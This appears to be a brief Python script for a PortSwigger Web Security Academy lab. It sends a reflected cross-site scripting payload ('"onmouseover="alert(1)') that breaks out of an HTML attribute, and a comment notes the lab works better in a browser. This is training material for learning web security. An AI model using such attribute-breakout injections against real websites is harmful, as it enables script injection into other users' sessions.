#https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

payload='?search="onmouseover="alert(1)'

url="https://0aec0031038cf3a382bd3db600f600bd.web-security-academy.net/"+payload

response=requests.get(url)

#This lab is better done with the browser as you need to hover over the element to trigger the function
